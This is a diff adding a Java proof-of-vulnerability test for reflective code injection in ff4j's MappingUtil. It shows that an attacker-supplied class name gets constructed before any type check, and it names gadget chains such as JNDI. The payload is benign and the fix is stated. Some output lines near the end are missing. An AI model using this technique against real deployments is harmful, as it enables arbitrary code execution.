+/**
+ * Proof-of-vulnerability for CWE-094 (Improper Control of Generation of Code / reflective
+ * code injection) in ff4j.
+ *
+ * Root cause: org.ff4j.utils.MappingUtil#instanceFlippingStrategy(String, String, Map) resolves
+ * an attacker-controlled class name with Class.forName(...) and invokes newInstance() BEFORE any
+ * check that the resolved class is actually assignable to the expected base type
+ * (org.ff4j.core.FlippingStrategy). The cast to FlippingStrategy only happens AFTER construction,
+ * so the no-arg constructor of ANY class reachable on the classpath runs unconditionally whenever
+ * a caller (properties parser, XML parser, JSON parser, or the embedded web console) forwards an
+ * untrusted "flipping strategy class" / "property type class" string into this sink.
+ *
+ * This PoV drives the real production entry point (MappingUtil.instanceFlippingStrategy) with an
+ * attacker-supplied class name that does NOT implement FlippingStrategy at all. On vulnerable
+ * code, the constructor of the attacker class still executes (observable side effect) before the
+ * post-construction cast fails and is swallowed into a FeatureAccessException. A correct fix must
+ * validate FlippingStrategy.class.isAssignableFrom(clazz) (or use an allow-list) BEFORE calling
+ * newInstance(), so the attacker class is never constructed and no side effect occurs.
+ */
+public class MappingUtilInjectionPoV {
+
+    /** Flips to true only if the attacker-controlled class is actually instantiated. */
+    static final AtomicBoolean PAYLOAD_EXECUTED = new AtomicBoolean(false);
+
+    /**
+     * Stand-in for an attacker-supplied "flipping strategy" class name. It intentionally does NOT
+     * implement org.ff4j.core.FlippingStrategy, to prove the sink performs no base-type check
+     * prior to reflective construction. Its constructor represents arbitrary attacker code that
+     * runs as a side effect of reflective instantiation (in a real gadget chain this could be a
+     * JNDI-triggering class, a file-writing class, etc.).
+     */
+    public static class NotAFlippingStrategy {
+        public NotAFlippingStrategy() {
+            PAYLOAD_EXECUTED.set(true);
+        }
+    }
+
+    public static void main(String[] args) {
+        String attackerControlledClassName = NotAFlippingStrategy.class.getName();
+        Map<String, String> initParams = new HashMap<String, String>();
+
+        boolean vulnerable = false;
+        try {
+            FlippingStrategy fs = MappingUtil.instanceFlippingStrategy("pov-uid", attackerControlledClassName, initParams);
+            // If a real FlippingStrategy is somehow returned, that is even more clearly wrong.
+            vulnerable = (fs != null) || PAYLOAD_EXECUTED.get();
+        } catch (Throwable t) {
+            // Expected on today's code: MappingUtil wraps the post-construction ClassCastException
+            // into a FeatureAccessException. By the time this exception is thrown, the attacker
+            // class's constructor has ALREADY run -- that is the vulnerability.
+            vulnerable = PAYLOAD_EXECUTED.get();
+        }
+
+        if (vulnerable) {

+                    + "attacker-controlled class '" + attackerControlledClassName + "' even though it does not "
+                    + "implement FlippingStrategy. No base-type check ran before Class.forName(...).newInstance().");
+            System.exit(0);

+                    + "construction; no side effect was observed.");

+        }
+    }
